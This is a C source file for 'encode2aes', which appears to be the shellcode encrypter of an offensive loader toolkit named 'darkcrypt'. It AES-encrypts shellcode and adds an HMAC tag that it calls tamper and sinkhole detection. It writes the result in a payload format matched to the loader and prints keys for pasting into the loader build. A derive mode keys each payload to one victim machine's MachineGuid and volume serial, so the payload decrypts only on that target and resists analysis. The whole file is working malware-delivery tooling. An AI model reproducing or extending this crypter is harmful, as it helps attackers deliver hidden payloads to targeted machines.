/*
 * encode2aes — AES-256-CBC shellcode encrypter
 *
 * Usage:
 *   encode2aes <input_shellcode>                                   (static mode)
 *   encode2aes --derive <machine_guid> <vol_serial_decimal> <input> (derive mode)
 *
 * Output file (aes.encrypted) — R7 payload format, matching the loader:
 *   magic(4) || version(2) || IV(16) || ciphertext || HMAC-SHA256(32)
 *
 * - The 6-byte header (magic "DCP1" + LE uint16 version) lets the loader
 *   reject a wrong/truncated payload with a clear diagnostic before the HMAC
 *   check. - IV is randomly generated per encryption and embedded after the
 *   header (the loader reads it from enc_payload[6..21]).
 * - Encrypts the input with AES-256-CBC (PKCS#7 padding).
 * - Computes HMAC-SHA256 over the CIPHERTEXT ONLY (not the header, not the IV,
 *   not the tag) with a separate 32-byte MAC key and appends the 32-byte tag.
 *   The loader recomputes this over enc_payload+22 (past the 6-byte header +
 *   16-byte IV) for cipher_len bytes and aborts on mismatch (tamper/sinkhole
 *   detection before any decryption).
 *
 * Key models:
 * - Static mode: random 32-byte AES key + 32-byte MAC key; prints them as C
 *   arrays to paste into a static-key loader build. (IV is also printed, but
 *   it lives in the file too.)
 * - Derive mode (--derive): derives the AES key + MAC key from the TARGET's
 *   machine fingerprint (MachineGuid + C: volume serial) via HKDF-SHA256,
 *   exactly as keyderive.c does on the target. The resulting payload only
 *   decrypts on that one machine. The operator must supply the target's
 *   MachineGuid and C: volume serial. The IV is still random per run.
 *
 * Changes from original:
 * - Platform-conditional RNG (BCryptGenRandom on Windows, /dev/urandom on Linux)
 * - F8:  HMAC-SHA256 tag appended to the encrypted payload (tamper/sinkhole
 *        detection; verified by the loader before decryption)
 * - F9:  per-target key derivation via HKDF-SHA256 (MachineGuid + volume serial
 *        + embedded salt). Added --derive <guid> <serial> mode.
 * - R7:  payload format changed to magic(4) || version(2) || IV(16) ||
 *        ciphertext || HMAC(32); DCP1 magic header lets the loader reject
 *        wrong/truncated payloads before the HMAC check.
 * - R4:  salt is now single-source (keyderive_derive_from_fingerprint) — the
 *        encoder no longer duplicates KD_SALT.
 * - F21: key/IV/MAC key zeroed via volatile loop before exit
 *
 * The SHA-256 / HMAC implementation below is self-contained (no OpenSSL, no
 * Windows CNG) so the Linux encoder builds with plain gcc and no extra libs,
 * matching the "no external crypto deps" philosophy of aes.c. The --derive
 * path additionally links keyderive.c + hmac.c (pure computation, portable).
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "aes.h"
#include "keyderive.h"

#ifdef _WIN32
#include <windows.h>
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")
#endif

static int random_bytes(uint8_t *buf, size_t len)
{
#ifdef _WIN32
    return BCryptGenRandom(NULL, buf, (ULONG)len,
                           BCRYPT_USE_SYSTEM_PREFERRED_RNG) == 0;
#else
    FILE *fp = fopen("/dev/urandom", "rb");
    if (!fp) return 0;
    size_t n = fread(buf, 1, len, fp);
    fclose(fp);
    return n == len;
#endif
}

/* =========================================================================
 * Self-contained SHA-256 (FIPS 180-4) + HMAC-SHA256 (RFC 2104)
 *
 * Pure standard C. Operates on the raw ciphertext so the loader can recompute
 * the same tag over the bytes it received and abort on mismatch (detecting
 * tampering or a sinkholed/shortened payload).
 * ========================================================================= */

#define SHA256_BLOCK  64u   /* input block size in bytes              */
#define SHA256_DIGEST 32u   /* output digest size in bytes            */

/* ---- R7: payload magic + version header ----
 * The encoded file is now: magic(4) || version(2) || IV(16) || ciphertext ||
 * HMAC(32). The 6-byte header lets the loader reject a wrong/truncated payload
 * with a clear diagnostic before the HMAC check. Magic = "DCP1"
 * (darkcrypt payload, version 1). These MUST match aes-main.c's
 * DC_PAYLOAD_* constants. */
#define DC_PAYLOAD_MAGIC0  'D'
#define DC_PAYLOAD_MAGIC1  'C'
#define DC_PAYLOAD_MAGIC2  'P'
#define DC_PAYLOAD_VERSION 1
#define DC_PAYLOAD_HDR_LEN 6   /* magic(4) + version(2) */

/* Per-round constants (first 32 bits of the fractional parts of the cube
 * roots of the first 64 primes). */
static const uint32_t sha256_k[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,
    0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,
    0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,
    0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,
    0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,
    0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,
    0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,
    0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,
    0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};

/* SHA-256 working state. */
typedef struct {
    uint32_t h[8];             /* current hash value                       */
    uint64_t len;               /* total message length in BITS processed   */
    uint8_t  buf[SHA256_BLOCK]; /* partial block buffer                     */
    size_t   buflen;            /* bytes currently in buf                    */
} sha256_ctx;

#define ROTR(x,n)  (((x) >> (n)) | ((x) << (32 - (n))))
#define CH(x,y,z)  (((x) & (y)) ^ (~(x) & (z)))
#define MAJ(x,y,z) (((x) & (y)) ^ ((x) & (z)) ^ ((y) & (z)))
#define EP0(x)  (ROTR(x,2)  ^ ROTR(x,13) ^ ROTR(x,22))
#define EP1(x)  (ROTR(x,6)  ^ ROTR(x,11) ^ ROTR(x,25))
#define SIG0(x) (ROTR(x,7)  ^ ROTR(x,18) ^ ((x) >> 3))
#define SIG1(x) (ROTR(x,17) ^ ROTR(x,19) ^ ((x) >> 10))

static void sha256_init(sha256_ctx *c)
{
    /* Initial hash values — first 32 bits of the fractional parts of the
     * square roots of the first 8 primes. */
    c->h[0] = 0x6a09e667; c->h[1] = 0xbb67ae85;
    c->h[2] = 0x3c6ef372; c->h[3] = 0xa54ff53a;
    c->h[4] = 0x510e527f; c->h[5] = 0x9b05688c;
    c->h[6] = 0x1f83d9ab; c->h[7] = 0x5be0cd19;
    c->len    = 0;
    c->buflen = 0;
}

/* Process one 64-byte block. */
static void sha256_block(sha256_ctx *c, const uint8_t *p)
{
    uint32_t w[64];
    for (int i = 0; i < 16; i++)   /* big-endian load of the 16 message words */
        w[i] = ((uint32_t)p[i*4]   << 24) |
               ((uint32_t)p[i*4+1] << 16) |
               ((uint32_t)p[i*4+2] << 8)  |
                (uint32_t)p[i*4+3];
    for (int i = 16; i < 64; i++)  /* extend the message schedule */
        w[i] = SIG1(w[i-2]) + w[i-7] + SIG0(w[i-15]) + w[i-16];

    uint32_t a = c->h[0], b = c->h[1], cc = c->h[2], d = c->h[3];
    uint32_t e = c->h[4], f = c->h[5], g  = c->h[6], h = c->h[7];

    for (int i = 0; i < 64; i++) {
        uint32_t t1 = h + EP1(e) + CH(e,f,g) + sha256_k[i] + w[i];
        uint32_t t2 = EP0(a) + MAJ(a,b,cc);
        h = g; g = f; f = e; e = d + t1;
        d = cc; cc = b; b = a; a = t1 + t2;
    }

    c->h[0]+=a; c->h[1]+=b; c->h[2]+=cc; c->h[3]+=d;
    c->h[4]+=e; c->h[5]+=f; c->h[6]+=g;  c->h[7]+=h;
}

static void sha256_update(sha256_ctx *c, const void *data, size_t len)
{
    const uint8_t *p = (const uint8_t *)data;
    c->len += (uint64_t)len * 8;        /* track total length in BITS */

    /* fill the partial block first */
    if (c->buflen) {
        size_t need = SHA256_BLOCK - c->buflen;
        size_t take  = len < need ? len : need;
        memcpy(c->buf + c->buflen, p, take);
        c->buflen += take; p += take; len -= take;
        if (c->buflen == SHA256_BLOCK) {
            sha256_block(c, c->buf);
            c->buflen = 0;
        }
    }
    /* process full blocks straight from the input */
    while (len >= SHA256_BLOCK) {
        sha256_block(c, p);
        p   += SHA256_BLOCK;
        len -= SHA256_BLOCK;
    }
    /* stash the remainder */
    if (len) {
        memcpy(c->buf + c->buflen, p, len);
        c->buflen += len;
    }
}

/* Finalize: append 0x80, zero-pad, then a 64-bit big-endian bit length. */
static void sha256_final(sha256_ctx *c, uint8_t out[SHA256_DIGEST])
{
    uint64_t bitlen = c->len;   /* already accumulated in update */

    /* append the 0x80 bit */
    c->buf[c->buflen++] = 0x80;
    if (c->buflen > SHA256_BLOCK - 8) {
        /* not enough room for the 8-byte length — pad this block out and
         * process it, then start a fresh block. */
        while (c->buflen < SHA256_BLOCK)
            c->buf[c->buflen++] = 0x00;
        sha256_block(c, c->buf);
        c->buflen = 0;
    }
    while (c->buflen < SHA256_BLOCK - 8)
        c->buf[c->buflen++] = 0x00;

    /* 64-bit big-endian length (bits) */
    for (int i = 7; i >= 0; i--)
        c->buf[c->buflen++] = (uint8_t)(bitlen >> (i * 8));
    sha256_block(c, c->buf);

    /* emit the hash, big-endian */
    for (int i = 0; i < 8; i++) {
        out[i*4]   = (uint8_t)(c->h[i] >> 24);
        out[i*4+1] = (uint8_t)(c->h[i] >> 16);
        out[i*4+2] = (uint8_t)(c->h[i] >> 8);
        out[i*4+3] = (uint8_t)(c->h[i]);
    }
}

/* One-shot SHA-256. */
static void sha256(const void *data, size_t len, uint8_t out[SHA256_DIGEST])
{
    sha256_ctx c;
    sha256_init(&c);
    sha256_update(&c, data, len);
    sha256_final(&c, out);
}

/*
 * HMAC-SHA256 (RFC 2104):
 *   tag = H((K0 ^ opad) || H((K0 ^ ipad) || msg))
 * where K0 is the key padded to the 64-byte block size (short keys are
 * zero-padded, long keys are hashed first).
 */
static void hmac_sha256(const uint8_t *key, size_t key_len,
                        const uint8_t *msg, size_t msg_len,
                        uint8_t out[SHA256_DIGEST])
{
    uint8_t k0[SHA256_BLOCK] = {0};

    if (key_len > SHA256_BLOCK)
        sha256(key, key_len, k0);          /* long key -> hash to 32 bytes  */
    else
        memcpy(k0, key, key_len);         /* short key -> zero-padded      */

    uint8_t ipad[SHA256_BLOCK], opad[SHA256_BLOCK];
    for (int i = 0; i < SHA256_BLOCK; i++) {
        ipad[i] = k0[i] ^ 0x36;
        opad[i] = k0[i] ^ 0x5c;
    }

    /* inner hash: H(ipad || msg) */
    sha256_ctx ic;
    uint8_t inner[SHA256_DIGEST];
    sha256_init(&ic);
    sha256_update(&ic, ipad, SHA256_BLOCK);
    sha256_update(&ic, msg, msg_len);
    sha256_final(&ic, inner);

    /* outer hash: H(opad || inner) */
    sha256_ctx oc;
    sha256_init(&oc);
    sha256_update(&oc, opad, SHA256_BLOCK);
    sha256_update(&oc, inner, SHA256_DIGEST);
    sha256_final(&oc, out);
}

/* F21: wipe a secret buffer with a volatile loop so the compiler can't
 * elide the writes. (encode2aes.c intentionally avoids obfuscation.h, which
 * pulls in windows.h, so we keep a tiny local helper.) */
static void secure_zero_local(void *p, size_t n)
{
    volatile uint8_t *vp = (volatile uint8_t *)p;
    while (n--) *vp++ = 0;
}

static void print_c_array(const char *name, const uint8_t *data, size_t len)
{
    printf("static const uint8_t %s[%zu] = {\n    ", name, len);
    for (size_t i = 0; i < len; i++) {
        printf("0x%02x", data[i]);
        if (i + 1 < len) {
            printf(",");
            if ((i + 1) % 8 == 0)
                printf("\n    ");
            else
                printf(" ");
        }
    }
    printf("\n};\n");
}

static void print_hex(const char *label, const uint8_t *data, size_t len)
{
    printf("%s: ", label);
    for (size_t i = 0; i < len; i++)
        printf("%02x", data[i]);
    printf("\n");
}

/* ------------------------------------------------------------------ *
 *  HKDF salt: NO LONGER DUPLICATED HERE (R4).
 *
 *  Previously this file kept its own ENC_KD_SALT copy of keyderive.c's KD_SALT
 *  with only a comment warning they must stay in sync — if one drifted, --derive
 *  payloads silently failed HMAC/decrypt on the target. The salt is now the
 *  single source of truth in keyderive.c (extern const uint8_t KD_SALT[16],
 *  declared in keyderive.h) and the shared derivation path
 *  keyderive_derive_from_fingerprint() is used below. This also means the
 *  R8 per-build salt (BUILD_ID mixed in when DARKCRYPT_BUILD_ID is defined)
 *  is handled centrally — the encoder gets it for free.
 * ------------------------------------------------------------------ */

int main(int argc, char *argv[])
{
    /* ------------------------------------------------------------------ *
     *  Argument parsing
     *
     *  Static mode (no --derive): one positional arg, the input file.
     *     ./encode2aes <input_shellcode>
     *  Derive mode: --derive <machine_guid> <vol_serial_decimal> <input>.
     *     ./encode2aes --derive 12345678-1234-1234-1234-123456789012 12345 payload.bin
     *
     *  In derive mode the AES key + MAC key are derived from the target's
     *  machine fingerprint (MachineGuid + C: volume serial) via HKDF-SHA256,
     *  exactly as the loader (keyderive.c) does on that target — so the
     *  emitted payload only decrypts on that one machine. The IV is still
     *  randomly generated per run.
     * ------------------------------------------------------------------ */
    int derive_mode = 0;
    const char *machine_guid = NULL;
    const char *vol_serial_str = NULL;
    const char *input_file    = NULL;

    if (argc >= 2 && strcmp(argv[1], "--derive") == 0) {
        /* --derive <guid> <serial> <input> -> argc == 5 */
        if (argc != 5) {
            fprintf(stderr,
                "[*] Usage (derive): %s --derive <machine_guid> <vol_serial_decimal> <input>\n",
                argv[0]);
            fprintf(stderr, "[*] Output: aes.encrypted  (R7: magic||ver||IV||ciphertext||HMAC)\n");
            return 1;
        }
        derive_mode    = 1;
        machine_guid   = argv[2];
        vol_serial_str = argv[3];
        input_file     = argv[4];
    } else {
        /* static mode: one positional input */
        if (argc != 2) {
            fprintf(stderr, "[*] Usage (static): %s <input_shellcode>\n", argv[0]);
            fprintf(stderr,
                "[*] Usage (derive):  %s --derive <machine_guid> <vol_serial_decimal> <input>\n",
                argv[0]);
            fprintf(stderr, "[*] Output: aes.encrypted  (R7: magic||ver||IV||ciphertext||HMAC)\n");
            return 1;
        }
        input_file = argv[1];
    }

    const char *output_file = "aes.encrypted";

    FILE *fp = fopen(input_file, "rb");
    if (!fp) { perror("[-] fopen input"); return 1; }

    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    if (file_size <= 0) {
        fprintf(stderr, "[-] Empty or invalid input file\n");
        fclose(fp);
        return 1;
    }

    uint8_t *data = malloc((size_t)file_size);
    if (!data) { perror("[-] malloc"); fclose(fp); return 1; }

    if (fread(data, 1, (size_t)file_size, fp) != (size_t)file_size) {
        fprintf(stderr, "[-] fread failed\n");
        free(data); fclose(fp); return 1;
    }
    fclose(fp);

    printf("[+] Read %ld bytes from %s\n", file_size, input_file);

    uint8_t key[AES_KEY_SIZE];
    uint8_t iv[AES_IV_SIZE];
    uint8_t mac_key[SHA256_DIGEST];   /* F8/F9: separate 32-byte HMAC key */

    /* ---- Key establishment ---- */
    if (derive_mode) {
        /* F9: derive AES key + MAC key from the target's machine fingerprint
         * (MachineGuid string + C: volume serial) via HKDF-SHA256, using the
         * same keyderive_fingerprint_from() + keyderive_derive_from_fingerprint()
         * the loader uses and the SAME embedded salt (single source: keyderive.c
         * KD_SALT, no duplication — R4). A payload encrypted here will only
         * verify/decrypt on that target. */
        char *endp = NULL;
        unsigned long serial_ul = strtoul(vol_serial_str, &endp, 10);
        if (endp == vol_serial_str || *endp != '\0') {
            fprintf(stderr, "[-] Invalid volume serial (must be decimal): %s\n",
                    vol_serial_str);
            free(data);
            return 1;
        }
        uint32_t vol_serial = (uint32_t)serial_ul;

        uint8_t fingerprint[64];
        keyderive_fingerprint_from(machine_guid, vol_serial, fingerprint);
        keyderive_derive_from_fingerprint(fingerprint, key, mac_key);

        printf("[+] Derive mode: keys derived from target fingerprint\n");
        printf("    MachineGuid : %s\n", machine_guid);
        printf("    Vol serial  : %u (0x%08x)\n", vol_serial, vol_serial);
        secure_zero_local(fingerprint, sizeof(fingerprint));
    } else {
        /* static mode: generate random AES key + MAC key */
        if (!random_bytes(key, AES_KEY_SIZE) ||
            !random_bytes(mac_key, SHA256_DIGEST)) {
            fprintf(stderr, "[-] Failed to generate random bytes\n");
            free(data); return 1;
        }
        printf("[+] Generated random 256-bit AES key and 256-bit MAC key\n");
    }

    /* The IV is ALWAYS randomly generated per encryption, regardless of key
     * model, and is embedded at the front of the output file. */
    if (!random_bytes(iv, AES_IV_SIZE)) {
        fprintf(stderr, "[-] Failed to generate random IV\n");
        free(data); return 1;
    }
    printf("[+] Generated random 128-bit IV (embedded at front of file)\n");

    aes_ctx_t ctx;
    aes_init(&ctx, key, iv);

    size_t out_len = 0;
    uint8_t *encrypted = aes_cbc_encrypt(&ctx, data, (size_t)file_size, &out_len);
    free(data);

    if (!encrypted) {
        fprintf(stderr, "[-] AES encryption failed\n");
        return 1;
    }
    printf("[+] Encrypted size : %zu bytes (PKCS#7 padded)\n", out_len);

    /* F8/F9/R7: HMAC-SHA256 over the CIPHERTEXT ONLY (not the header, not the
     * IV, not the tag), using the separate MAC key. The loader recomputes this
     * over enc_payload+22 (past the 6-byte header + 16-byte IV) for cipher_len
     * bytes and aborts on mismatch, catching tampering or a sinkholed/truncated
     * payload before any decryption. */
    uint8_t tag[SHA256_DIGEST];
    hmac_sha256(mac_key, SHA256_DIGEST, encrypted, out_len, tag);
    printf("[+] HMAC-SHA256 tag computed over ciphertext (%d bytes), appended\n",
           SHA256_DIGEST);

    /* ---- Write R7 payload file: magic(4) || version(2) || IV(16) ||
     *      ciphertext || HMAC(32) ---- */
    fp = fopen(output_file, "wb");
    if (!fp) {
        perror("[-] fopen output");
        free(encrypted); return 1;
    }
    /* R7: 6-byte header — magic "DCP1" + version (LE uint16). */
    uint8_t hdr[DC_PAYLOAD_HDR_LEN] = {
        DC_PAYLOAD_MAGIC0, DC_PAYLOAD_MAGIC1, DC_PAYLOAD_MAGIC2,
        (uint8_t)('0' + DC_PAYLOAD_VERSION),
        (uint8_t)(DC_PAYLOAD_VERSION & 0xFF),
        (uint8_t)((DC_PAYLOAD_VERSION >> 8) & 0xFF)
    };
    if (fwrite(hdr, 1, DC_PAYLOAD_HDR_LEN, fp) != DC_PAYLOAD_HDR_LEN) {
        fprintf(stderr, "[-] fwrite header failed\n");
        fclose(fp); free(encrypted); return 1;
    }
    if (fwrite(iv, 1, AES_IV_SIZE, fp) != AES_IV_SIZE) {
        fprintf(stderr, "[-] fwrite IV failed\n");
        fclose(fp); free(encrypted); return 1;
    }
    if (fwrite(encrypted, 1, out_len, fp) != out_len) {
        fprintf(stderr, "[-] fwrite ciphertext failed\n");
        fclose(fp); free(encrypted); return 1;
    }
    if (fwrite(tag, 1, SHA256_DIGEST, fp) != SHA256_DIGEST) {
        fprintf(stderr, "[-] fwrite tag failed\n");
        fclose(fp); free(encrypted); return 1;
    }
    fclose(fp);
    free(encrypted);

    size_t total_len = DC_PAYLOAD_HDR_LEN + AES_IV_SIZE + out_len + SHA256_DIGEST;
    printf("[+] R7 payload saved to %s "
           "(%d hdr + %d IV + %zu ciphertext + %d tag = %zu bytes total)\n\n",
           output_file, DC_PAYLOAD_HDR_LEN, AES_IV_SIZE, out_len,
           SHA256_DIGEST, total_len);

    print_hex("Key     (hex)", key,     AES_KEY_SIZE);
    print_hex("IV      (hex)", iv,      AES_IV_SIZE);
    print_hex("MAC key (hex)", mac_key, SHA256_DIGEST);

    if (!derive_mode) {
        /* static mode: print paste-ready C arrays for a static-key loader build.
         * (The IV is also embedded in aes.encrypted, but it's printed here for
         *  builds that hard-code it.) */
        printf("\n/* ---- Paste into aes-main.c (static key build) ---- */\n");
        print_c_array("AES_KEY",     key,     AES_KEY_SIZE);
        printf("\n");
        print_c_array("AES_IV",      iv,      AES_IV_SIZE);
        printf("\n");
        print_c_array("AES_MAC_KEY", mac_key, SHA256_DIGEST);
        printf("\n/* NOTE: AES_IV is also embedded at the front of aes.encrypted */\n");
        printf("/*       (the loader reads it from the payload, not from here) */\n");
    } else {
        printf("\n/* --derive mode: keys are not pasted. They are derived at\n");
        printf("   runtime on the target from its MachineGuid + C: volume\n");
        printf("   serial via keyderive_derive(). The IV is per-run and is\n");
        printf("   embedded at the front of aes.encrypted. */\n");
    }

    /* F21: wipe the secret key/IV/MAC key before exit so they don't linger
     * in stack memory or get captured in a core dump. */
    secure_zero_local(key,     sizeof(key));
    secure_zero_local(iv,      sizeof(iv));
    secure_zero_local(mac_key, sizeof(mac_key));

    return 0;
}